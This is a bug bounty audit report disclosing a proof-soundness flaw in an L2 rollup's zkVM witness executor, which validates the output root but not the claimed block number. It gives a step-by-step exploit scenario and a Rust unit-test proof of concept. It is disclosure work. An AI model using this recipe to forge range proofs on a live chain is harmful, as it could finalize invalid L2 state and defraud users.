# 76540 bc medium witnessexecutor proves root without proving claimed l2 block number was reached

**Submitted on May 4th 2026 at 19:28:57 UTC by @jesse03 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76540
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * A bug in the respective layer 0/1/2 network code that results in unintended smart contract behavior with no concrete funds at direct risk

## Description

`WitnessExecutor::run` proves a root, but does not prove it reached the claimed L2 block number.

`base-0.8.0-rc.28/crates/succinct/utils/client/src/witness/executor.rs`

```rust
async fn run<O, DP, P>(
    &self,
    boot: BootInfo,
    pipeline: DP,
    cursor: Arc<RwLock<PipelineCursor>>,
    l2_provider: OracleL2ChainProvider<O>,
    intermediate_root_interval: u64,
) -> Result<(BootInfo, Vec<alloy_primitives::B256>)>
```

`WitnessExecutor::run` calls `advance_to_target` with the claimed L2 block number:

```rust
let (safe_head, output_root, intermediate_roots) = advance_to_target(
    &mut driver,
    rollup_config.as_ref(),
    Some(boot.claimed_l2_block_number),
    intermediate_root_interval,
)
.await?;
```

It then validates only the output root:

```rust
if output_root != boot.claimed_l2_output_root {
    return Err(anyhow!(
        "Failed to validate L2 block #{number} with claimed output root {claimed_output_root}. Got {output_root} instead",
        number = safe_head.block_info.number,
        output_root = output_root,
        claimed_output_root = boot.claimed_l2_output_root,
    ));
}
```

But it never checks that:

```rust
safe_head.block_info.number == boot.claimed_l2_block_number
```

That means the proof can succeed even if derivation stopped before the claimed target block.

The issue becomes critical because `run` returns the original `boot_clone`:

```rust
Ok((boot_clone, intermediate_roots))
```

Then `run_range_program` commits this original boot info publicly:

```rust
sp1_zkvm::io::commit(&BootInfoStruct::new(
    boot_info,
    l2_pre_block_number,
    intermediate_roots,
));
```

And `BootInfoStruct::new` uses the claimed block number from `BootInfo`:

```rust
l2BlockNumber: boot_info.claimed_l2_block_number,
l2PostRoot: boot_info.claimed_l2_output_root,
```

So the public proof output can claim:

> “I proved output root R at L2 block N”

even though the program only derived up to an earlier block M < N.

The driver explicitly allows early termination when the derivation pipeline runs out of data.

In `base-0.8.0-rc.28/crates/proof/driver/src/core.rs`:

```rust
Err(PipelineErrorKind::Critical(PipelineError::EndOfSource)) => {
    warn!(target: "client", "Exhausted data source; Halting derivation and using current safe head.");

    // Adjust the target block number to the current safe head, as no more blocks
    // can be produced.
    if target.is_some() {
        target = Some(tip_cursor.l2_safe_head.block_info.number);
    };

    continue;
}
```

If `target = Some(boot.claimed_l2_block_number)` and the pipeline reaches `EndOfSource`, the driver silently changes the target to the current safe head.

Then it returns successfully:

```rust
return Ok(result
    .unwrap_or((tip_cursor.l2_safe_head, tip_cursor.l2_safe_head_output_root)));
```

This is dangerous for a proof program. A proving circuit/program must fail if it cannot reach the exact public target it claims to prove.

## Exploit

Assume the real derivation can only reach block `110`.

The attacker supplies boot data like this:

```
agreed_l2_output_root     = R100
safe starting block       = 100
claimed_l2_block_number   = 1_000_000
claimed_l2_output_root    = R110
```

The witness contains enough data to derive blocks `101..110`, but not enough data to derive up to `1_000_000`.

{% stepper %}
{% step %}

### WitnessExecutor::run asks the driver to derive to block `1_000_000`

`WitnessExecutor::run` requests derivation to the claimed block number.
{% endstep %}

{% step %}

### The driver derives only to block `110`

Derivation stops at the last available block.
{% endstep %}

{% step %}

### The pipeline hits `EndOfSource`

The data source is exhausted.
{% endstep %}

{% step %}

### The driver silently changes the target to block `110`

The target is adjusted to the current safe head.
{% endstep %}

{% step %}

### The driver returns `(safe_head = block 110, output_root = R110)`

The returned output root matches the derived head.
{% endstep %}

{% step %}

### `WitnessExecutor::run` checks only `output_root == boot.claimed_l2_output_root`

This passes because the attacker set:

```
claimed_l2_output_root = R110
```

{% endstep %}

{% step %}

### The function returns the original `boot_clone`, which still says `claimed_l2_block_number = 1_000_000`

The original claimed block number is preserved.
{% endstep %}

{% step %}

### `run_range_program` commits a public `BootInfoStruct` saying `l2BlockNumber = 1_000_000` and `l2PostRoot = R110`

The proof has now falsely attested that `R110` is the output root at block `1_000_000`.
{% endstep %}
{% endstepper %}

## Impact

This is a proof soundness failure.

A malicious prover can generate a valid zkVM proof for a false L2 range statement. Specifically, they can claim that an output root corresponds to a later L2 block number without actually deriving or executing blocks up to that number.

This can allow:

```
skipping unexecuted L2 blocks,
forging invalid range proofs,
creating invalid aggregate proofs,
and finalizing or verifying incorrect L2 sequence ranges.
```

The aggregation program does not fix this. It verifies the proof digest of each `BootInfoStruct` and checks sequencing between public boot infos, but it has no independent knowledge of the actual block number reached inside `WitnessExecutor::run`.

So once the range proof commits the wrong `l2BlockNumber`, aggregation trusts it.

## Root cause

`WitnessExecutor::run` treats root equality as sufficient:

```rust
output_root == boot.claimed_l2_output_root
```

But the proven statement includes both:

```rust
boot.claimed_l2_output_root
boot.claimed_l2_block_number
```

The function must prove the pair:

```
(block number, output root)
```

not just the output root.

## Proof of Concept

```rust
mod tests {
    use std::{fmt, sync::Arc};

    use alloy_consensus::{Header, Sealed};
    use alloy_primitives::B256;
    use async_trait::async_trait;
    use base_common_rpc_types_engine::BasePayloadAttributes;
    use base_consensus_derive::{
        OriginProvider, Pipeline, PipelineError, PipelineErrorKind, PipelineResult, Signal,
        SignalReceiver, StepResult,
    };
    use base_consensus_genesis::{RollupConfig, SystemConfig};
    use base_consensus_registry::Registry;
    use base_proof::BootInfo;
    use base_proof_driver::{Driver, DriverPipeline, Executor, PipelineCursor, TipCursor};
    use base_proof_executor::BlockBuildingOutcome;
    use base_protocol::{AttributesWithParent, BlockInfo, L2BlockInfo};
    use spin::RwLock;

    use super::advance_to_target;
    use crate::boot::BootInfoStruct;

    #[derive(Debug)]
    struct EndOfSourcePipeline {
        rollup_config: RollupConfig,
        origin: BlockInfo,
        produce_payload_calls: usize,
    }

    impl EndOfSourcePipeline {
        fn new(rollup_config: RollupConfig) -> Self {
            Self {
                rollup_config,
                origin: BlockInfo::new(B256::from([0x11; 32]), 1, B256::ZERO, 0),
                produce_payload_calls: 0,
            }
        }
    }

    impl Iterator for EndOfSourcePipeline {
        type Item = AttributesWithParent;

        fn next(&mut self) -> Option<Self::Item> {
            None
        }
    }

    impl OriginProvider for EndOfSourcePipeline {
        fn origin(&self) -> Option<BlockInfo> {
            Some(self.origin)
        }
    }

    #[async_trait]
    impl SignalReceiver for EndOfSourcePipeline {
        async fn signal(&mut self, _signal: Signal) -> PipelineResult<()> {
            Ok(())
        }
    }

    #[async_trait]
    impl Pipeline for EndOfSourcePipeline {
        fn peek(&self) -> Option<&AttributesWithParent> {
            None
        }

        async fn step(&mut self, _cursor: L2BlockInfo) -> StepResult {
            StepResult::StepFailed(PipelineError::EndOfSource.crit())
        }

        fn rollup_config(&self) -> &RollupConfig {
            &self.rollup_config
        }

        async fn system_config_by_number(
            &mut self,
            _number: u64,
        ) -> Result<SystemConfig, PipelineErrorKind> {
            Ok(SystemConfig::default())
        }
    }

    #[async_trait]
    impl DriverPipeline<EndOfSourcePipeline> for EndOfSourcePipeline {
        fn flush(&mut self) {}

        async fn produce_payload(
            &mut self,
            _l2_safe_head: L2BlockInfo,
        ) -> Result<AttributesWithParent, PipelineErrorKind> {
            self.produce_payload_calls += 1;
            Err(PipelineError::EndOfSource.crit())
        }
    }

    #[derive(Debug)]
    struct UnusedExecutor;

    #[derive(Debug)]
    struct UnusedExecutorError;

    impl fmt::Display for UnusedExecutorError {
        fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
            f.write_str("unused executor error")
        }
    }

    impl std::error::Error for UnusedExecutorError {}

    #[async_trait]
    impl Executor for UnusedExecutor {
        type Error = UnusedExecutorError;

        async fn wait_until_ready(&mut self) {}

        fn update_safe_head(&mut self, _header: Sealed<Header>) {}

        async fn execute_payload(
            &mut self,
            _attributes: BasePayloadAttributes,
        ) -> Result<BlockBuildingOutcome, Self::Error> {
            unreachable!("the PoC stops at EndOfSource before executing a payload")
        }

        fn compute_output_root(&mut self) -> Result<B256, Self::Error> {
            unreachable!("the PoC reuses the cursor output root")
        }
    }

    fn test_rollup_config() -> RollupConfig {
        RollupConfig {
            genesis: base_consensus_genesis::ChainGenesis {
                system_config: Some(SystemConfig::default()),
                ..Default::default()
            },
            ..Default::default()
        }
    }

    fn cursor_at(block_number: u64, output_root: B256) -> Arc<RwLock<PipelineCursor>> {
        let origin = BlockInfo::new(B256::from([0x22; 32]), 1, B256::ZERO, 0);
        let mut cursor = PipelineCursor::new(0, origin);
        let safe_head = L2BlockInfo {
            block_info: BlockInfo::new(
                B256::from([0x33; 32]),
                block_number,
                B256::from([0x44; 32]),
                0,
            ),
            ..Default::default()
        };
        let header = Sealed::new_unchecked(
            Header { number: block_number, timestamp: 0, ..Default::default() },
            safe_head.block_info.hash,
        );

        cursor.advance(origin, TipCursor::new(safe_head, header, output_root));
        Arc::new(RwLock::new(cursor))
    }

    #[test]
    fn poc_end_of_source_can_publish_claimed_block_without_reaching_it() {
        const REACHED_BLOCK: u64 = 110;
        const CLAIMED_BLOCK: u64 = 1_000_000;

        let claimed_root = B256::from([0x55; 32]);
        let rollup_config = test_rollup_config();
        let cursor = cursor_at(REACHED_BLOCK, claimed_root);
        let mut driver = Driver::new(
            Arc::clone(&cursor),
            UnusedExecutor,
            EndOfSourcePipeline::new(rollup_config.clone()),
        );

        let (safe_head, output_root, intermediate_roots) = base_proof::block_on(advance_to_target(
            &mut driver,
            &rollup_config,
            Some(CLAIMED_BLOCK),
            10,
        ))
        .expect("EndOfSource with an explicit target is currently accepted");

        assert_eq!(driver.pipeline.produce_payload_calls, 1);
        assert_eq!(safe_head.block_info.number, REACHED_BLOCK);
        assert_ne!(safe_head.block_info.number, CLAIMED_BLOCK);
        assert_eq!(output_root, claimed_root);
        assert!(intermediate_roots.is_empty());

        let boot_info = BootInfo {
            l1_head: B256::from([0x66; 32]),
            agreed_l2_output_root: B256::from([0x77; 32]),
            claimed_l2_output_root: output_root,
            claimed_l2_block_number: CLAIMED_BLOCK,
            chain_id: 0,
            rollup_config,
            l1_config: Registry::l1_config(1).expect("missing mainnet L1 config").clone(),
            proposer: Default::default(),
            intermediate_block_interval: 0,
            l1_head_number: 0,
        };

        assert_eq!(output_root, boot_info.claimed_l2_output_root);

        let public_boot_info =
            BootInfoStruct::new(boot_info, REACHED_BLOCK.saturating_sub(10), intermediate_roots);

        assert_eq!(public_boot_info.l2PostRoot, claimed_root);
        assert_eq!(public_boot_info.l2BlockNumber, CLAIMED_BLOCK);
        assert_ne!(public_boot_info.l2BlockNumber, safe_head.block_info.number);
    }
}
```
